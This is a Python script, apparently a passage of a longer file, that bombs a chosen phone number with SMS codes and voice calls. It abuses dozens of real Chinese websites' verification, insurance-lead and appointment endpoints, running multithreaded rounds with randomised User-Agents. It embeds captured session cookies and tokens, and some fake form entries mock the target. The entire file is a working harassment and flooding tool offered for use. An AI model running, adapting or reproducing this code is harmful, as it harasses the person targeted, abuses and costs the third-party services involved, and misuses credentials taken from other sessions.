            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004432) NetType/4G Language/zh_CN",
            "Referer": "https://servicewechat.com/wx96983c5aa4a177cb/20/page-frame.html"
        }
    },
    {
        "method": "POST",
        "url": "https://tg-admin-api.916sy.com/api/auth/register_get_phone",
        "headers": {
            "Host": "tg-admin-api.916sy.com", "Connection": "keep-alive", "From-Type": "wxMiNi",
            "content-type": "application/x-www-form-urlencoded", "Access-Token": "",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wxa46b3fcee3827fcb/1/page-frame.html"
        },
        "data": "phone=13800138000"
    }
]

api_configs.extend(new_api_list)

# ========== 新增的两个接口 ==========
api_configs.append({
    "method": "POST",
    "url": "https://customer-apply-diversion.teddymobile.cn/api/v1/auth/sendSms",
    "headers": {
        "host": "customer-apply-diversion.teddymobile.cn",
        "xweb_xhr": "1",
        "user-agent": "__UA__",
        "content-type": "application/json",
        "accept": "*/*",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://servicewechat.com/wxf123c0cb425589de/5/page-frame.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "priority": "u=1, i"
    },
    "data": {"phone": "13800138000"}
})

api_configs.append({
    "method": "POST",
    "url": "https://yiqilai.net.cn/authorization/auth/sendValidateMsg",
    "headers": {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Host": "yiqilai.net.cn",
        "PROJECT-CODE": "72014",
        "Referer": "https://servicewechat.com/wxd354b6655f7d129a/10/page-frame.html",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "SunnyNetHTTPClient": "true",
        "User-Agent": "__UA__",
        "xweb_xhr": "1"
    },
    "data": {"phone": "13800138000"}
})

# ========== 整合第二个脚本的接口配置（保险类等） ==========
insurance_api_configs = [
    # 中民保险网
    {
        "method": "POST",
        "url": "https://m.zhongmin.cn/Topic/AddYuyueNew",
        "headers": {
            "Host": "m.zhongmin.cn",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "__UA__",
            "Accept": "*/*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://m.zhongmin.cn",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://m.zhongmin.cn/benefitGuarantee/Index?&miniprogram=1&isarticle=0&miniphone=&cityid=&openid=o_-GO4k4GF7wKK1edUGK-e3YKxtI&areaCode=",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        "cookies": {
            "ASP.NET_SessionId": "xbg1wz02h2ebhydki1uwcpdg",
            "cookieUserName": "cookie0F4D39BF5852DA4D2376B66403A635D9",
            "areaCodeOut": "Code%3D",
            "Hm_lvt_6c7f533b7cc67b6f40de81580fec468e": "1754308837",
            "HMACCOUNT": "28B89CEFEC2F563F",
            "userId": "14808934",
            "tokenZM": "57315b3f242c460cb55c76402220baa0",
            "referrer": "",
            "UVTOKEN": "M7c786431bbe94da89ffa67683c4df869",
            "miniprogram": "1",
            "Hm_lpvt_6c7f533b7cc67b6f40de81580fec468e": "1754373078",
            "areaCode": "HMBGDW04202",
            "isFirstLogin": "true",
        },
        "data": "name=救赎&phone=13800000000&sex=0&type=1306&des=惠民保障预约"
    },
    # 小雨伞保险
    {
        "method": "POST",
        "url": "https://www.xiaoyusan.com/Phonecrm/createOuterActNoLogin",
        "headers": {
            "Host": "www.xiaoyusan.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-Sh-Traceid": "936e759279edc705dfdf4c3dab890cec",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "sec-ch-ua-mobile": "?1",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "__UA__",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.xiaoyusan.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.xiaoyusan.com/shk/wkpage/index/38376d_2023000830.1.html?eva=2023000830&chn=mlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008&wkpushstate=1754377971445",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        "cookies": {
            "acw_tc": "0a0011e917543779705586941e5a05034d5f35d8fc1bf2cbdaaf1ab34504fe",
            "PHPSESSID": "d593e37a75386f616c013f451ad09d58",
            "touchurl": "http%3A%2F%2Fwww.xiaoyusan.com%2Factivity%2FbasicActActionV2%2FgetActUserInfo",
            "_xys_fd_id": "d593e37a75386f616c013f451ad09d58",
            "_xys_s_id": "xbehat7atj7m0u3ry1f8605fwkqs1qwb",
            "Hm_lvt_8dd2422e78fa31be4e5f5469ebe50589": "1754377971",
            "Hm_lpvt_8dd2422e78fa31be4e5f5469ebe50589": "1754377971",
            "HMACCOUNT": "28B89CEFEC2F563F",
            "_ga": "GA1.2.1558367497.1754377974",
            "_gid": "GA1.2.1201782440.1754377974",
            "_gat_gtag_UA_118701918_1": "1",
            "SERVERID": "0eb4557f6237e94d9e97f8fbc080f699|1754377978|1754377970",
            "SERVERCORSID": "0eb4557f6237e94d9e97f8fbc080f699|1754377978|1754377970",
        },
        "data": "chn=mlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008&eva=2023000830&name=救赎&mobile=13800000000&cbs=&biztype=&act_name=cal_insure_no_verify&outer_act_link=https%3A%2F%2Fwww.xiaoyusan.com%2Fshk%2Fwkpage%2Findex%2F38376d_2023000830.1.html%3Feva%3D2023000830%26chn%3Dmlxm-gzh-jbpyl-xxsj-zhengweiqiang-1v1zx-h5-xys-01-cp-008%26wkpushstate%3D1754377971445&remark=%E4%B8%BA%E8%B0%81%E5%AE%9A%E5%88%B6%EF%BC%9A%E8%87%AA%E5%B7%B1%2C%E8%B4%AD%E4%B9%B0%E9%99%A9%E7%A7%8D%EF%BC%9A%E9%87%8D%E7%96%BE%E9%99%A9"
    },
    # 企信保险（第一个）
    {
        "method": "POST",
        "url": "https://cps.qixin18.com/v3/m/api/common/sendReservatSmsCode?md=0.4350888810127329",
        "headers": {
            "Host": "cps.qixin18.com",
            "Connection": "keep-alive",
            "traceparent": "00-ec6e919fb633d89b0cfe89478947868c-600925b4aada7870-01",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "__UA__",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://cps.qixin18.com",
            "X-Requested-With": "com.tencent.mm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://cps.qixin18.com/m/apps/cps/bxn1096837/product/detail?prodId=104994&planId=130301&tenantId=0&createTime=1737170298565&beidouWxDistinctId=1754393057537-3919538-085c85ad06848e-55739345&beidouWxLoginId=",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        "cookies": {
            "nodejs_sid": "s%3AJe330pDnPvmMafrtsgLGXZubqQg7Plv7.FB9kbFV89DrYQBJkYRb0UkaPNwzEQm5Trgd0yUlseOk",
            "fed-env": "production",
            "_qxc_token_": "eb81b40d-43f9-4bcf-8b57-bd165da4fad7",
            "hz_guest_key": "3x9a97LHUHZ4y3XPekPH_1754097046804_1_1015544_38625430",
            "_bl_uid": "j5mjkd0XtbvkC138scUCkhstU8yy",
            "merakApiSessionId": "ebb083327198781a0976uqPJu53NwsTZ",
            "MERAK_DEVICE_ID": "54826bc105b8826c0935c7ef9cb76101",
            "MERAK_RECALL_ID": "98b083327198781a0b76EQOm7F0i9Itv",
            "MERAK_SESSIONID_ID": "0ab083327198781a0b77ccweQE49Inxl",
            "token": "4de2157f-751a-4fef-9629-56be19d9366c",
            "acw_tc": "ac11000117543930671605244e17564aa24627b1ad4373f6c54dee62ac49a4",
            "beidou_mini_cross_state": "%7B%22_beidouWxDistinctId%22%3A%221754393057537-3919538-085c85ad06848e-55739345%22%2C%22_beidouWxLoginId%22%3A%22%22%7D",
            "beidou_jssdk_session_id": "1754393069461-7502498-0eb149ad9e396b8-95476587",
            "beidoudata2015jssdkcross": "%7B%22distinct_id%22%3A%221754393057537-3919538-085c85ad06848e-55739345%22%2C%22first_id%22%3A%221986854db025b8-049c104f343d668-622e2a12-430320-1986854db03495%22%2C%22props%22%3A%7B%22%24search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22session_id%22%3A%22%22%2C%22%24page_visit_id%22%3A%221754393057537-3919538-085c85ad06848e-55739345-1754393069466%22%2C%22%24device_id%22%3A%221986854db025b8-049c104f343d668-622e2a12-430320-1986854db03495%22%2C%22sdk_injection%22%3A%22INJECTED%22%2C%22login_id%22%3A%22%22%2C%22login_Id%22%3A%22%22%7D",
            "MERAK_ENTER_PAGE_TIME": "1754393069682",
            "tfstk": "g2om8HgG-vC00-sfodqXlxXJRhgMkoZ_UfIT6lFwz7PSD5FxQl-ihj4T3Gkasfc8NrF2llHa_7l_6iE25OugBRWV7GPVabDsBSnTHIwZZXGhXKgx6tgS9vSxDEZOjoZTbBdpvHBjhlZwz2sbHsNzIJtObSPacurhifEBvHHj3nDCGFxKXld0aRFabrz4UuP7I15q_rzPz7w_QsyN0LDzN7yN7-rw48ybp5PZ_lJoU7wab5lauLDzNRra_QcPuSN4M0Ri_aAKquQK2-40TxPqUXnzB6et37SOQ4y0otH4ZGSZ4VxVqnNw46Vs4fqUo0JOSWq7ZR2mmdQQ12eiQJqFpGkogbo380d5X5Szoa7EgnS_93D15Na4F8Vdpza-0R2e7OJkEwW_u8wr2Lvl5Na4F8VpELb3hry7U0C..",
        },
        "data": {
            "telephone": "13800000000",
            "nvcData": "%7B%22a%22%3A%22FFFF000000000176F978%22%2C%22c%22%3A%221754393074418%3A0.11043106819183113%22%2C%22d%22%3A%22nvc_message_h5%22%2C%22h%22%3A%7B%22key1%22%3A%22code0%22%2C%22nvcCode%22%3A400%2C%22umidToken%22%3A%22T2gAS31uagM2X-E0z2j2JuoQ9YfSR0ti-jqcPAZIthsx8iZBAl1Z7vDTZfx5_2e30Ok%3D%22%7D%2C%22j%22%3A%7B%22test%22%3A1%7D%2C%22b%22%3A%22140%23j5ToaOeezzPXyQo2FxBQA3SoYtkr1PCOldd96z9Jk1L06PJD5Csanhp61jGBhxAOoVmS%2FihPGjWXxp1L25stjOCDyzldmtrj7u2yz%2BDQzPgflp1zzXE62m9NBQzxOmHK9pJjzzrb22U3l61x0b2IV2VjUQDa2DcR0uG8zbzeP183l6TzDDrbnxEl6gfa2Pc3Vtg2zFzB2ws9lUWLz8riE2h%2F8brzHs83K3JjzFzb2LDZlQ5xOPFbciCqlQzz2nH%2BV31QFQzXHO83l6TzH8rb8Og%2FxF%2Bx2PD3VtCfzxfS2dAWl3MzzDxiVOGl3lbzzyc4Vpg%2FzdrI2osYPfSzMrMiV2E%2FlMTx2Pp%2BN3lqoF%2B4211WlplJzPKvV2TcxQ4d2P4JhoMTzTbi2U5pl4Qo5fzI2z6HkHmijDapVrMn%2F2I4jearIkM%2BIXKnqdqAtmQLHluyyuI%2FLigLnFwu90YKzhKsb4MDX2%2Fj3fxaTvyx2GBaAp5hxz5FTZvsc5b9yd3BvpPfvycy8%2BU8kSOYW1Pu0POhXQZtYobTZuDZ6%2FhIWU2ok8qzwNyRoBa7J0%2F5uBUFxw5aUEzMw%2FHintdyKouRJHkIIDm9e6uDyY6hgi%2BmDMY%2BDxS03%2F6TRMqlrLnIKxrYLShpPGwIbvhA7bssFKsXax2qHT8RFT8QieM55h3b5be%2FYoEHt0XcJzgvBtq5JGRo8DD1lUjpOlxOkZU3N78niCXLo8VlzZaxVXRCuOcKqiNLCMG%2F5sd9MOt3ChJC36pNbGoKkxCGNduPxPqZXFyHJSfsebfJICy%2BbT1xqiIJacOtbd4%2FWF6o2JgslXqz3Dc3Kp1zilUb2d2ZioK5KDnJP5bHcLtXNxRVR%2BrR4Msg8v82no70sAg2O3qjfuqW3LFamluYz47%2BjwWU82KW5ucAUQtcsIm436iZ3%2F1%2B4Xc%2FvBJ3ngE3%2FtH6SWNjM5k4wKuYLhCgUgmqDB1z3LUcVMDwNYGD0zDSZrdyVY3jraUa4X4A2hbU0dVLcQm2LCy9OuQtFpV9S0wu6pSgtx8JN41%3D%22%2C%22e%22%3A%22cbFWvt9kexwpfxCybnUZIeRXz45AI-bGe58D_qNbcmaHrS9W8frU1RtVpWNk_x6OKmDiaOmCDj54dYR_DJ9RspqEIDdNHNK5HUMU627XqqmfOR8E5TFJv32bOkU5rsK0uL94kY14W-TIhbX0kuKFAPh88DLPh6d509g_3Yca4XtnK9A4GT4Z9fixZrARvDomK9ichTMCJ4brC9lV3KiLNhZwuR_Njcgb3lv1fLasHEj3mIXbaXIS8qXt8wPlkyGQqBQtPXt9KBZtGtiogryxFUug5sRl8IKnUhzHY1aq4lbgL_dJz7qe5eBpCK0VEI0X0TZk9CYUEg01YTuvCMKFMuIknevhmPdD8bHW918-lSpCiNImoKrKVCuZjzOta_aLZ6AvmqZYXV2p-2jwyK3k5-MAVa2XVLqq6mUb2LMtaCGzFnEPsho4Dj5ALMo32aVsOoLGymA9GsWPL4xkgVjHZ-Ll5Zvf59cs6ikTIPkaRQ0%22%2C%22i%22%3Atrue%7D"
        }
    },
    # Atomychina
    {
        "method": "POST",
        "url": "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code",
        "headers": {
            "Host": "mobilev2.atomychina.com.cn",
            "Connection": "keep-alive",
            "pragma": "no-cache",
            "cache-control": "no-cache",
            "Accept": "application/json",
            "x-requested-with": "XMLHttpRequest",
            "design-site-locale": "zh-CN",
            "Accept-Language": "zh-CN",
            "X-HTTP-REQUEST-DOMAIN": "mobilev2.atomychina.com.cn",
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx74d705d9fabf5b77/171/page-frame.html",
            "User-Agent": "__UA__",
            "Accept-Encoding": "gzip, deflate, br"
        },
        "cookies": {
            "acw_tc": "0b6e704217543973526363742e7228ce87cdcab16e6e1ce0c22c775c0bf455",
            "guestId": "f67b8c82-f6f4-4a2d-b857-70223098c12c",
            "guestId.sig": "cf36A-025BEBDTEeSi1ADFHYAHI",
        },
        "data": {"mobile": "13800000000", "captcha": "1111", "token": "1111", "prefix": 86}
    },
    # hy021
    {
        "method": "POST",
        "url": "https://wx.hy021.net/api/mb1001/guahao",
        "headers": {
            "Host": "wx.hy021.net",
            "Connection": "keep-alive",
            "appid": "1282a884-bde3-11ef-801e-b8cef617a30e",
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wx7ac8f33f519ebaa2/1/page-frame.html",
            "User-Agent": "__UA__",
            "Accept-Encoding": "gzip, deflate, br"
        },
        "data": {
            "data": {
                "type": 2,
                "name": "救赎",
                "age": "35",
                "phone": "13800000000",
                "detail": "脑子不正常好像是脑残了",
                "gender": "男",
                "sex": 1,
                "doctor": "牛玉权"
            },
            "appid": "1282a884-bde3-11ef-801e-b8cef617a30e"
        }
    },
    # Blue Planplus
    {
        "method": "POST",
        "url": "https://blue.planplus.cn/account/api/account/v1/member/sms/sendCode?mobile=13800000000",
        "headers": {
            "Host": "blue.planplus.cn",
            "Connection": "keep-alive",
            "x-user-token": "TrpusLsAnnNeyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NTQ1Mjk3NzAsInRva2VuIjoie1wiZnJvbVwiOlwicGxhdGZvcm1cIixcIm9wZW5pZFwiOlwib3lLN3UwQXJMVGYybjRNR2oyc0tJYVBTX0hKd1wiLFwidW5pb25pZFwiOlwib0hlQ2NzLUFwSU05N1V2anc1a3prY1E1T3N0b1wifSJ9.o1o4upLSYY2tuiNcrJIG2r-F4DoUcw6YOana759BhzLPLmpRFXDrHKOvNPBDhijD1GKvu7vnc1MyL4BHk0iEhA",
            "content-type": "application/json",
            "charset": "utf-8",
            "Referer": "https://servicewechat.com/wxd4c6c416bdab4315/51/page-frame.html",
            "User-Agent": "__UA__",
            "Accept-Encoding": "gzip, deflate, br"
        }
        # 无请求体
    },
    # 安徽米硕网络科技（GET请求）
    {
        "method": "GET",
        "url": "https://shop.hfmsq.com/prod-api/sendMsg?phoneNumber=13800000000",
        "headers": {
            "Host": "shop.hfmsq.com",
            "User-Agent": "__UA__",
            "Referer": "https://servicewechat.com/wx848613725517fc02/2/page-frame.html"
        }
    }
]

# 将保险类接口追加到主配置列表
api_configs.extend(insurance_api_configs)

# ========== 特殊电话接口 ==========
def send_sms_special(phone):
    """特殊电话轰炸接口，间隔发送"""
    try:
        url = "https://job.sdjuliangnet.com/mengpinapiv2.php/index/sendvmsv2"
        headers = {
            "Host": "job.sdjuliangnet.com", "Connection": "keep-alive", "charset": "utf-8",
            "User-Agent": "mmm", "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx71ca15a0ba7a5d0d/11/page-frame.html"
        }
        data_template = ('{"type":1,"tel":"18888888888","ticket":"tr03iCvK4_tx9j01lj2Gmisv-F4Aj3K3gHN3TTvkHU3MF5ttlw_995xyRTDxi7GFtAdNlbIWULh6Ot5FY6KgzLsWvXljJVnnQD71mRJhKQ4FkPlJ_mV5Hk0Gj0bQIryrokNYFXNAjscydkxJtQTadyR12A**","randstr":"@oHt","sendSource":2,"userToken":null,"loginType":3,"channel":102,"app_id":7,"oaid":"uniapp","api_city":"","api_ip_city":""}')
        data = replace_phone(data_template, phone)
        requests.post(url, headers=headers, data=data, timeout=3)
    except:
        pass

# ---------- 统一发送函数 ----------
def send_api(api_conf, phone):
    """发送单个接口请求"""
    try:
        headers = replace_phone(api_conf.get('headers', {}), phone)
        url = replace_phone(api_conf['url'], phone)
        data = replace_phone(api_conf.get('data'), phone) if 'data' in api_conf else None
        cookies = replace_phone(api_conf.get('cookies'), phone) if 'cookies' in api_conf else None

        # 替换 __UA__ 为随机UA
        if headers:
            for k, v in headers.items():
                if isinstance(v, str) and '__UA__' in v:
                    headers[k] = v.replace('__UA__', generate_random_user_agent())

        method = api_conf['method'].upper()
        timeout = 3  # 加快速度，降低超时

        if method == 'GET':
            requests.get(url, headers=headers, cookies=cookies, timeout=timeout)
        elif method == 'POST':
            if isinstance(data, dict):
                requests.post(url, headers=headers, cookies=cookies, json=data, timeout=timeout)
            else:
                requests.post(url, headers=headers, cookies=cookies, data=data, timeout=timeout)
        elif method == 'PUT':
            if isinstance(data, dict):
                requests.put(url, headers=headers, cookies=cookies, json=data, timeout=timeout)
            else:
                requests.put(url, headers=headers, cookies=cookies, data=data, timeout=timeout)
        return True
    except:
        return False

# ---------- 主程序 ----------
def main():
    phone = input(Fore.YELLOW + "请输入手机号码: " + Style.RESET_ALL).strip()
    if not phone or not phone.isdigit() or len(phone) != 11:
        print(Fore.RED + "请输入有效的11位手机号码！" + Style.RESET_ALL)
        return

    total = len(api_configs)
    rounds = 5  
    max_workers = 30  


    for round_num in range(1, rounds + 1):
        print(Fore.MAGENTA + f"\n========== 第 {round_num} 轮开始 ==========" + Style.RESET_ALL)
        success = 0
        fail = 0
        with tqdm(total=total, desc=Fore.CYAN + f"第{round_num}轮" + Style.RESET_ALL, unit="个", ncols=80,
                  bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]") as pbar:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_conf = {executor.submit(send_api, conf, phone): conf for conf in api_configs}
                for future in as_completed(future_to_conf):
                    if future.result():
                        success += 1
                    else:
                        fail += 1
                    pbar.update(1)
                    pbar.set_postfix_str(f"成功: {Fore.GREEN}{success}{Style.RESET_ALL} 失败: {Fore.RED}{fail}{Style.RESET_ALL}", refresh=False)
        print(Fore.GREEN + f"第 {round_num} 轮结束：成功 {success}，失败 {fail}，总计 {total}" + Style.RESET_ALL)

    print(Fore.CYAN + "\n开始执行电话接口..." + Style.RESET_ALL)
    special_success = 0
    special_fail = 0
    # 电话接口执行10次，间隔5秒
    for i in tqdm(range(10), desc="特殊接口", unit="次"):
        try:
            send_sms_special(phone)
            special_success += 1
        except:
            special_fail += 1
        if i < 9:
            time.sleep(5)  # 从10秒改为5秒
    print(Fore.GREEN + f"特殊接口执行完毕：成功 {special_success}，失败 {special_fail}" + Style.RESET_ALL)

    print(Fore.CYAN + "\n所有任务完成！" + Style.RESET_ALL)

if __name__ == "__main__":
    main()